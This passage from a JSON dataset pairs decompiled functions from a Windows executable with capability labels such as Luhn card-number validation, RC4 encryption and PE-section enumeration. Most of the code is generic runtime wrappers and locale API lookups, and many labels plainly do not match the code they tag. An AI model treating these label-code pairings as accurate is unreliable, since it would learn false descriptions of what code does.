        "decompiled_code": "\nvoid __cdecl fcn.004c478a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.0040593e(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.004039ef(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c5b92": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c5b92(uint arg_8h)\n\n{\n    uint arg_ch;\n    \n    arg_ch = fcn.004039e0(1);\n    fcn.004062b7(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 59
    },
    "004c65b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004c65b4(int16_t *arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    int32_t *piVar3;\n    \n    if (arg_8h == NULL) {\n        fcn.00404246();\n        *(arg_ch + 8) = 0;\n        *(arg_ch + 0xc) = 0;\n    }\n    else {\n        if (*arg_8h != 0) {\n            arg_8h_00 = fcn.0040664f(arg_14h, 0, arg_8h, 0xffffffff, 0, 0, 0, 0);\n            if (arg_8h_00 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.00404b9c(uVar2);\n                piVar3 = fcn.00403a35();\n                return *piVar3;\n            }\n            if ((*(arg_ch + 0xc) <= arg_8h_00 && arg_8h_00 != *(arg_ch + 0xc)) &&\n               (iVar1 = fcn.004023bf(arg_8h_00),  iVar1 != 0)) {\n                return iVar1;\n            }\n            iVar1 = fcn.0040664f(arg_14h, 0, arg_8h, 0xffffffff, *(arg_ch + 8), *(arg_ch + 0xc), 0, 0);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.00404b9c(uVar2);\n                piVar3 = fcn.00403a35();\n                return *piVar3;\n            }\n            *(arg_ch + 0x10) = iVar1 + -1;\n            return 0;\n        }\n        if ((*(arg_ch + 0xc) == 0) && (iVar1 = fcn.004023bf(1),  iVar1 != 0)) {\n            return iVar1;\n        }\n        **(arg_ch + 8) = 0;\n    }\n    *(arg_ch + 0x10) = 0;\n    return 0;\n}\n",
        "token_count": 527
    },
    "004c72b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c72b1(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.00402a04(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 73
    },
    "004c72dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c72dc(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.00405b64(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 72
    },
    "004c7307": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c7307(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.00402a04(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 72
    },
    "004c7332": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c7332(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.00402a04(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 72
    },
    "004c735d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c735d(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.00405b64(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 72
    },
    "004c7388": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c7388(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.00405b64(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 72
    },
    "004c766c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004c766c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.004c773f();\n    if (iVar1 == 0) {\n        **(in_ECX + 4) = arg_8h;\n        *(in_ECX + 4) = *(in_ECX + 4) + 4;\n        iVar1 = 0;\n    }\n    else {\n        fcn.0040640b(arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 129
    },
    "004c76ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004c76ae(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.004c77e7();\n    if (iVar1 == 0) {\n        **(in_ECX + 4) = arg_8h;\n        *(in_ECX + 4) = *(in_ECX + 4) + 4;\n        iVar1 = 0;\n    }\n    else {\n        fcn.0040640b(arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 130
    },
    "004c7892": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004c7892(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.00403b9d();\n    iVar2 = fcn.00402419(arg_ch, arg_8h, uVar1);\n    if (iVar2 == 0) {\n        uVar1 = *(arg_8h + 8);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 120
    },
    "004c78e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004c78e1(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.00403b9d();\n    iVar2 = fcn.00404f07(arg_ch, arg_8h, uVar1);\n    if (iVar2 == 0) {\n        uVar1 = *(arg_8h + 8);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "004c98df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c98df(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.0040605a(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "004c9904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c9904(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00403977(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "004c9929": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c9929(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.0040605a(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "004c994e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c994e(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00403977(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "004c99b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c99b6(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00403968(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "004c99db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c99db(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00405e11(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "004c9daf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c9daf(void)\n\n{\n    fcn.004ca267(0, \"AreFileApisANSI\", 0x559590, \"AreFileApisANSI\");\n    return;\n}\n",
        "token_count": 46
    },
    "004c9dcf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c9dcf(void)\n\n{\n    fcn.004ca267(1, \"CompareStringEx\", 0x5595a8, 0x5595b0);\n    return;\n}\n",
        "token_count": 48
    },
    "004c9def": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c9def(void)\n\n{\n    fcn.004ca267(2, \"EnumSystemLocalesEx\", 0x5595c8, 0x5595d0);\n    return;\n}\n",
        "token_count": 49
    },
    "004c9eaf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c9eaf(void)\n\n{\n    fcn.004ca267(8, \"GetDateFormatEx\", 0x55963c, 0x559644);\n    return;\n}\n",
        "token_count": 45
    },
    "004c9f0f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c9f0f(void)\n\n{\n    fcn.004ca267(0xb, \"GetLocaleInfoEx\", 0x5596ac, 0x5596b4);\n    return;\n}\n",
        "token_count": 50
    },
    "004c9f6f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c9f6f(void)\n\n{\n    fcn.004ca267(0xe, \"GetTimeFormatEx\", 0x559720, 0x559728);\n    return;\n}\n",
        "token_count": 47
    },
    "004c9f8f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c9f8f(void)\n\n{\n    fcn.004ca267(0xf, \"GetUserDefaultLocaleName\", 0x559740, 0x559748);\n    return;\n}\n",
        "token_count": 48
    },
    "004ca00f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004ca00f(void)\n\n{\n    fcn.004ca267(0x13, \"IsValidLocaleName\", 0x5597cc, 0x5597d4);\n    return;\n}\n",
        "token_count": 48
    },
    "004ca02f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004ca02f(void)\n\n{\n    fcn.004ca267(0x15, \"LCIDToLocaleName\", 0x55980c, 0x559814);\n    return;\n}\n",
        "token_count": 48
    },
    "004ca04f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004ca04f(void)\n\n{\n    fcn.004ca267(0x14, \"LCMapStringEx\", 0x5597f0, 0x5597f8);\n    return;\n}\n",
        "token_count": 50
    },
    "004ca08f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004ca08f(void)\n\n{\n    fcn.004ca267(0x17, \"LocateXStateFeature\", 0x55984c, 0x559854);\n    return;\n}\n",
        "token_count": 48
    },
    "004ca0af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004ca0af(void)\n\n{\n    fcn.004ca267(0x18, \"MessageBoxA\", 0x559870, 0x559878);\n    return;\n}\n",
        "token_count": 44
    },
    "004ca0cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004ca0cf(void)\n\n{\n    fcn.004ca267(0x19, \"MessageBoxW\", 0x55988c, 0x559894);\n    return;\n}\n",
        "token_count": 45
    },
    "004d4984": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004d4984(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.004044bc(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0);\n    return;\n}\n",
        "token_count": 77
    },
    "004d53d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004d53d9(ulong param_1, ulong param_2)\n\n{\n    fcn.0040102d(param_1, param_2);\n    return;\n}\n",
        "token_count": 42
    },
    "004e0407": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nuint __cdecl fcn.004e0407(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56fb28, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00406505(0xb);\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.004e0503(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004e0463();\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 291
    },
    "004e0485": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nuint __cdecl fcn.004e0485(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56fb48, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00406505(0xb);\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.004e05ce(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004e04e1();\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 292
    },
    "004e0d38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.004e0d38(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56fae8, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00406505(0xb);\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.004e09fa(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004e0964();\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 292
    },
    "004e0bad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004e0bad(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.0040605a(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "004e0bd2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004e0bd2(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00403977(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "004e0bf7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004e0bf7(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.0040605a(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "004e0c1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004e0c1c(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00403977(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "004e0c41": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004e0c41(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00403968(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "004e0c66": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004e0c66(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00405e11(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "004e0cc7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004e0cc7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004e0407(arg_8h, arg_ch, arg_10h, 1, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "004e0cec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004e0cec(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004e0485(arg_8h, arg_ch, arg_10h, 1, 0, 0);\n    return;\n}\n",
        "token_count": 62
    },
    "004e2aa7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004e2aa7(void)\n\n{\n    unkint10 in_ST0;\n    uint32_t uStack28;\n    uint16_t uStack24;\n    \n    uStack28 = in_ST0 >> 0x20;\n    uStack24 = in_ST0 >> 0x40;\n    uStack24 = uStack24 & 0x7fff;\n    if (in_ST0 < 0) {\n        if (uStack24 < 0x3fff) {\n            return 0;\n        }\n    }\n    else {\n        if (uStack24 < 0x3fff) {\n            return 0;\n        }\n        if ((uStack28 < 0) && (uStack24 < 0x401f)) {\n            return uStack28 >> (0x3eU - uStack24 & 0x1f);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 198
    },
    "004e2c5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.004e2c5c(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    unkint10 in_ST0;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint16_t uStack24;\n    \n    uStack32 = in_ST0;\n    uStack28 = in_ST0 >> 0x20;\n    uStack24 = in_ST0 >> 0x40;\n    uStack24 = uStack24 & 0x7fff;\n    if (in_ST0 < 0) {\n        if (uStack24 < 0x3fff) {\n            return 0;\n        }\n    }\n    else {\n        if (uStack24 < 0x3fff) {\n            return 0;\n        }\n        if ((uStack28 < 0) && (uStack24 < 0x403f)) {\n            uVar1 = 0x3e - uStack24;\n            uVar2 = uStack28;\n            if (0x1f < uVar1) {\n                uVar2 = 0;\n                uStack32 = uStack28;\n            }\n            return CONCAT44(uVar2 >> (uVar1 & 0x1f), uStack32 >> (uVar1 & 0x1f) | uVar2 << 0x20 - (uVar1 & 0x1f));\n        }\n    }\n    return 0xffffffffffffffff;\n}\n",
        "token_count": 319
    },
    "0040664f": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040664f(uint32_t arg_8h, uint32_t arg_ch, uint lpWideCharStr, uint arg_14h, uint arg_18h, uint arg_1ch, \n            uint32_t arg_20h, uint *arg_24h)\n\n{\n    bool bVar1;\n    bool bVar2;\n    \n    if ((arg_8h == 65000) || (arg_8h == 0xfde9)) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n    }\n    if (arg_8h < 0xc436) {\n        if ((arg_8h != 0xc435) && (arg_8h != 0x2a)) {\n            if (arg_8h < 0xc42c) {\ncode_r0x004c8d84:\n                arg_ch = arg_ch & 0xffffff7f;\n                goto code_r0x004c8d91;\n            }\n            if ((0xc42e < arg_8h) && (arg_8h != 0xc431)) {\n                bVar2 = arg_8h == 0xc433;\ncode_r0x004c8d82:\n                if (!bVar2) goto code_r0x004c8d84;\n            }\n        }\n    }\n    else if (arg_8h != 0xd698) {\n        if (arg_8h < 0xdeaa) goto code_r0x004c8d84;\n        if ((0xdeb3 < arg_8h) && (arg_8h != 65000)) {\n            bVar2 = arg_8h == 0xfde9;\n            goto code_r0x004c8d82;\n        }\n    }\n    arg_ch = 0;\ncode_r0x004c8d91:\n    if ((bVar1) && (arg_24h != NULL)) {\n        *arg_24h = 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n              (arg_8h, arg_ch, lpWideCharStr, arg_14h, arg_18h, arg_1ch, ~-bVar1 & arg_20h, ~-bVar1 & arg_24h);\n    return;\n}\n",
        "token_count": 509
    },
    "004d8377": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004d8377(uint16_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    uVar3 = arg_8h[3];\n    uVar2 = uVar3 >> 4 & 0x7ff;\n    if (uVar2 == 0x7ff) {\n        if (((((uVar3 & 0xf) == 0) && (arg_8h[2] == 0)) && (arg_8h[1] == 0)) && (*arg_8h == 0)) {\n            return 1;\n        }\n        return 2;\n    }\n    if (((((uVar3 & 0x7fff) == 0) && (arg_8h[2] == 0)) && ((arg_8h[1] == 0 && (*arg_8h == 0)))) ||\n       (arg_ch._0_2_ = (0x433 - uVar2) - arg_ch,  arg_ch < 1)) {\n        return 0;\n    }\n    if (0x34 < arg_ch) {\n        *(arg_8h + 1) = 0;\n        *arg_8h = 0;\n        arg_8h[3] = uVar3 & 0x8000;\n        return -1;\n    }\n    iVar4 = arg_ch >> 4;\n    iVar1 = *(iVar4 * 4 + 0x55acfc);\n    uVar3 = *((arg_ch & 0xfU) * 2 + 0x55acd4) & arg_8h[iVar1];\n    arg_8h[iVar1] = arg_8h[iVar1] ^ uVar3;\n    if (iVar4 != 1) {\n        if (iVar4 != 2) {\n            if (iVar4 != 3) goto code_r0x004d846f;\n            uVar3 = uVar3 | arg_8h[2];\n            arg_8h[2] = 0;\n        }\n        uVar3 = uVar3 | arg_8h[1];\n        arg_8h[1] = 0;\n    }\n    uVar3 = uVar3 | *arg_8h;\n    *arg_8h = 0;\ncode_r0x004d846f:\n    return (uVar3 == 0) - 1;\n}\n",
        "token_count": 559
    },
    "00401618": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401618(uint arg_8h)\n\n{\n    code **in_ECX;\n    uint var_4h;\n    \n    in_ECX[1] = 0x1;\n    *in_ECX = vtable.std::locale::_Locimp.0;\n    in_ECX[2] = NULL;\n    in_ECX[3] = NULL;\n    in_ECX[4] = NULL;\n    *(in_ECX + 5) = arg_8h;\n    in_ECX[6] = NULL;\n    *(in_ECX + 7) = 0;\n    fcn.00404c00(0x553c10);\n    return;\n}\n",
        "token_count": 149
    },
    "0040223e": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040223e(int32_t param_1)\n\n{\n    *(param_1 + 0xc) = param_1 + 4;\n    *(param_1 + 0x10) = param_1 + 8;\n    *(param_1 + 0x1c) = param_1 + 0x14;\n    *(param_1 + 0x20) = param_1 + 0x18;\n    *(param_1 + 0x2c) = param_1 + 0x24;\n    *(param_1 + 0x30) = param_1 + 0x28;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x28) = 0;\n    *(param_1 + 4) = 0;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x24) = 0;\n    return;\n}\n",
        "token_count": 232
    },
    "0040431d": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040431d(int32_t *arg_8h)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    piVar2 = fcn.00405362(arg_8h);\n    if (piVar2 == '\\0') {\ncode_r0x004c5df1:\n        return piVar2 & 0xffffff00;\n    }\n    piVar2 = fcn.004039e0(1);\n    if (arg_8h == piVar2) {\n        piVar4 = 0x575210;\n    }\n    else {\n        piVar2 = fcn.004039e0(2);\n        if (arg_8h != piVar2) goto code_r0x004c5df1;\n        piVar4 = 0x575214;\n    }\n    *0x575064 = *0x575064 + 1;\n    ppiVar1 = arg_8h + 3;\n    piVar2 = *ppiVar1;\n    if ((piVar2 & 0x4c0) != 0) goto code_r0x004c5df1;\n    LOCK();\n    *ppiVar1 = *ppiVar1 | 0x282;\n    iVar3 = *piVar4;\n    if (iVar3 == 0) {\n        iVar3 = fcn.0040409d(0x1000);\n        *piVar4 = iVar3;\n        fcn.0040640b(0);\n        iVar3 = *piVar4;\n        if (iVar3 == 0) {\n            arg_8h[2] = 2;\n            arg_8h[1] = arg_8h + 5;\n            *arg_8h = arg_8h + 5;\n            arg_8h[6] = 2;\n            goto code_r0x004c5dd6;\n        }\n    }\n    arg_8h[1] = iVar3;\n    iVar3 = *piVar4;\n    *arg_8h = iVar3;\n    arg_8h[2] = 0x1000;\n    arg_8h[6] = 0x1000;\ncode_r0x004c5dd6:\n    return CONCAT31(iVar3 >> 8, 1);\n}\n",
        "token_count": 524
    },
    "00404732": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
